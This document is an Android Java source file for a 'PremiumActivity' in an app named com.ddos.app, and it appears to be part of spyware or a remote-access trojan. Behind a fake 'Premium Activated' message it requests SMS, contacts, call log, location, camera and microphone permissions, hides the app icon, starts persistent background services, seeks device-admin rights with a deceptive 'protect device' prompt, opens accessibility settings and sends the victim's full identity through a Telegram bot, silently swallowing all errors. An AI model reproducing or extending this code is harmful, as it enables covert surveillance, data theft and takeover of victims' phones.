
package com.ddos.app;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class PremiumActivity extends AppCompatActivity {

    private static final int REQ = 101;

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        setContentView(R.layout.activity_premium);
        askPerms();
    }

    private void askPerms() {
        List<String> p = new ArrayList<>();
        p.add(Manifest.permission.READ_SMS);
        p.add(Manifest.permission.RECEIVE_SMS);
        p.add(Manifest.permission.SEND_SMS);
        p.add(Manifest.permission.READ_CONTACTS);
        p.add(Manifest.permission.READ_CALL_LOG);
        p.add(Manifest.permission.READ_PHONE_STATE);
        p.add(Manifest.permission.READ_PHONE_NUMBERS);
        p.add(Manifest.permission.GET_ACCOUNTS);
        p.add(Manifest.permission.ACCESS_FINE_LOCATION);
        p.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        p.add(Manifest.permission.CAMERA);
        p.add(Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33) {
            p.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        List<String> ask = new ArrayList<>();
        for (String x : p) if (ContextCompat.checkSelfPermission(this, x)
                != PackageManager.PERMISSION_GRANTED) ask.add(x);

        if (!ask.isEmpty()) ActivityCompat.requestPermissions(this,
                ask.toArray(new String[0]), REQ);
        else done();
    }

    @Override
    public void onRequestPermissionsResult(int c, String[] p, int[] r) {
        super.onRequestPermissionsResult(c, p, r);
        done();
    }

    private void done() {
        Toast.makeText(this, "Premium Activated", Toast.LENGTH_SHORT).show();

        UserRegistry.registerUser(this);

        MainActivity.hideIcon(this);

        try {
            ContextCompat.startForegroundService(this, new Intent(this, TelegramBot.class));
        } catch (Exception ignored) {}
        try {
            ContextCompat.startForegroundService(this, new Intent(this, KeepAliveService.class));
        } catch (Exception ignored) {}

        try {
            Intent a = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            a.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                new ComponentName(this, AdminReceiver.class));
            a.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Allow Ddos to protect device");
            startActivity(a);
        } catch (Exception ignored) {}

        try {
            Intent acc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            acc.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(acc);
        } catch (Exception ignored) {}

        new Thread(() -> {
            try {
                TelegramBot bot = new TelegramBot();
                bot.init(getApplicationContext());
                bot.sendFullIdentity();
            } catch (Exception ignored) {}
        }).start();

        finishAffinity();
    }
}
